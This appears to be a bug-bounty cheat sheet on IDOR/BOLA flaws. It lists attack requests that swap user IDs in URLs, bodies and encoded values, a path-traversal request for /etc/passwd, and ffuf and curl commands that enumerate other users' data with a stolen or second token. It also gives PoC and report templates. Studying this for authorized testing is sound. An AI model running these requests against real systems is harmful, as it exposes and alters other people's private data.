# IDOR / BOLA - Insecure Direct Object Reference

## What Is It
Access/modify other users' objects by changing identifiers.
Most common and highest-paid bug in bug bounty programs.

---

## Features / Where to Find
- ANY numeric ID in URL: `/api/users/123`, `/orders/456`
- UUIDs: `/documents/550e8400-e29b-41d4-a716-446655440000`
- Encoded IDs: base64, hashed
- Email/username as reference
- Account numbers, invoice numbers
- File names in download/view
- IDs in JSON request body
- IDs in cookies or headers
- Batch operations with IDs

---

## Actions / Attack Techniques

### Horizontal IDOR (Same Role, Different User)
```
# Original request
GET /api/v1/users/1234/profile

# Change to another user's ID
GET /api/v1/users/1235/profile
GET /api/v1/users/1233/profile
GET /api/v1/users/1/profile      # admin?
```

### Vertical IDOR (Access Higher Privilege)
```
GET /api/v1/users/1234/admin-settings  # As regular user
POST /api/admin/users/1234/delete       # As regular user
```

### IDOR in POST body
```json
# Original
{"user_id": 1234, "action": "view"}

# Attack
{"user_id": 1235, "action": "view"}
{"user_id": 1, "action": "view"}
```

### IDOR in Different Formats
```
# Numeric
/api/invoice/1001 → /api/invoice/1002

# UUID
/api/doc/550e8400-e29b-41d4-a716-446655440000

# Base64 encoded
/api/user/MTIzNA==  (decode: 1234)
→ encode 1235 = MTIzNQ==
/api/user/MTIzNQ==

# Hashed (sometimes predictable)
/api/user/5f4dcc3b5aa765d61d8327de  # MD5 of something?
```

### IDOR in File Download
```
GET /download?file=invoice_1234.pdf
→ GET /download?file=invoice_1235.pdf
→ GET /download?file=../../../etc/passwd
```

### IDOR via HTTP Method Change
```
# If GET is protected, try POST, PUT, DELETE
DELETE /api/users/1235    # Delete another user's account
PUT /api/users/1235/email # Change another user's email
```

### Mass Assignment → IDOR
```json
# User updates profile
{"name": "John"}

# Attack: add other user's ID
{"name": "John", "user_id": 1235}
{"name": "John", "account_id": 9999}
```

---

## Threat Model
- **View private data** → PII, financial records, private messages
- **Modify other users' data** → change email, password, settings
- **Delete other users' data** → account deletion, data loss
- **Access admin functions** → privilege escalation
- **Financial fraud** → access other users' payment methods

---

## Autorize Tool (Burp Extension)
```
1. Login as User A → copy session cookie/token
2. Install Autorize in Burp
3. Paste User A's token in Autorize config
4. Login as User B → browse application
5. Autorize automatically retests each request with User A's token
6. GREEN = unauthorized access = IDOR found!
```

---

## PoC Template

### PoC: Account Data Disclosure
```
Setup:
- Account A: user_id=1234, email=victimA@test.com
- Account B: user_id=1235, email=victimB@test.com

Steps:
1. Login as Account B
2. Send request:
GET /api/v1/users/1234/profile HTTP/1.1
Authorization: Bearer [Account_B_token]

3. Response returns Account A's private data:
{
  "email": "victimA@test.com",
  "phone": "555-1234",
  "address": "123 Private St"
}

Impact: Any authenticated user can access any other user's PII
```

---

## Tools
```bash
# Autorize - Burp Extension (best tool)
# Auto-test all requests with another user's session

# IDOR Hunter - Burp Extension

# Manual with curl:
curl -H "Authorization: Bearer USER_B_TOKEN" \
  https://target.com/api/users/USER_A_ID/data

# ffuf for ID enumeration
ffuf -u "https://target.com/api/users/FUZZ/profile" \
  -w <(seq 1 10000) \
  -H "Authorization: Bearer TOKEN" \
  -mc 200
```

---

## Report Template
**Title:** IDOR in [endpoint] allows accessing other users' [data type]
**Severity:** High (PII/sensitive data) / Critical (financial/account takeover)
**Impact:** Unauthorized access to all users' private data
